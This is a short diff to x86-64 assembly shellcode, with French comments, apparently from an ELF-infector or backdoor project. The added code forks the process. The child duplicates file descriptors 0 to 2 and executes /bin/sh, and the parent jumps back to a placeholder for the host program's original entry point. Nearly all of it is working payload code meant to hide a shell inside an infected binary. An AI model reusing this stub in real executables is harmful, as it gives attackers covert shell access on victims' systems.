@@ -2,7 +2,7 @@
 BITS 64
 
 _start:
-    ; ===== fork() =====
+    ; ===== fork() ===== crée deux copies du programme 
     xor     rax, rax
     mov     al, 57              ; syscall fork = 57
     syscall
@@ -47,3 +47,19 @@ dup_loop:
     inc     rsi             ; 0 → 1 → 2
     cmp     rsi, 3
     jne     dup_loop
+
+    ; execve("/bin/sh", NULL, NULL)
+    xor     rax, rax
+    push    rax
+    mov     rbx, 0x68732F6E69622F2F
+    push    rbx
+    mov     rdi, rsp
+    xor     rsi, rsi
+    xor     rdx, rdx
+    mov     al, 59
+    syscall
+
+        ; ===== PÈRE — retour à e_entry original =====
+retour_pere:
+    mov     rax, 0x4141414141414141
+    jmp     rax
